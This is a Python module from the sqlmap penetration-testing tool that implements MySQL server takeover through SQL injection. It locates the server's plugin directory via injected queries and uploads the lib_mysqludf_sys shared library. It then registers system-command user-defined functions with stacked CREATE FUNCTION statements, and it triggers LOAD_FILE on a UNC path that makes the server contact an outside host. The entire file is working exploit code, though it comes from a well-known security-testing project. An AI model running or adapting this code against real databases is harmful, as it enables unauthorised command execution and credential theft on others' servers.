#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import re

from lib.core.agent import agent
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        self.__basedir = None
        self.__datadir = None

        GenericTakeover.__init__(self)

    def udfSetRemotePath(self):
        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
        if banVer >= "5.1.19":
            if self.__basedir is None:
                logger.info("retrieving MySQL base directory absolute path")

                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                self.__basedir = inject.getValue("SELECT @@basedir")

                if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                    kb.os = "Windows"
                else:
                    kb.os = "Linux"

            # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
            if kb.os == "Windows":
                self.__basedir += "/lib/plugin"
            else:
                self.__basedir += "/lib/mysql/plugin"

            self.__basedir = ntToPosixSlashes(normalizePath(self.__basedir))
            self.udfRemoteFile = "%s/%s.%s" % (self.__basedir, self.udfSharedLibName, self.udfSharedLibExt)

            logger.warn("this will only work if the database administrator created manually the '%s' subfolder" % self.__basedir)

        # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
        else:
            #logger.debug("retrieving MySQL data directory absolute path")

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
            #self.__datadir = inject.getValue("SELECT @@datadir")

            # NOTE: specifying the relative path as './udf.dll'
            # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
            self.__datadir = "."
            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))

            if re.search("^[\w]\:[\/\\\\]+", self.__datadir, re.I):
                kb.os = "Windows"
            else:
                kb.os = "Linux"

            # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
            # C:\WINDOWS\system32, @@basedir\bin or @@datadir
            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        if kb.os == "Windows":
            self.udfLocalFile   += "/mysql/windows/32/lib_mysqludf_sys.dll"
            self.udfSharedLibExt = "dll"
        else:
            self.udfLocalFile   += "/mysql/linux/32/lib_mysqludf_sys.so"
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            ret = inpRet["return"]

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
            inject.goStacked("DROP FUNCTION %s" % udf)
            inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        if not kb.stackedTest:
            query   = agent.prefixQuery(" AND LOAD_FILE('%s')" % self.uncPath)
            query   = agent.postfixQuery(query)
            payload = agent.payload(newValue=query)

            Request.queryPage(payload)
        else:
            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
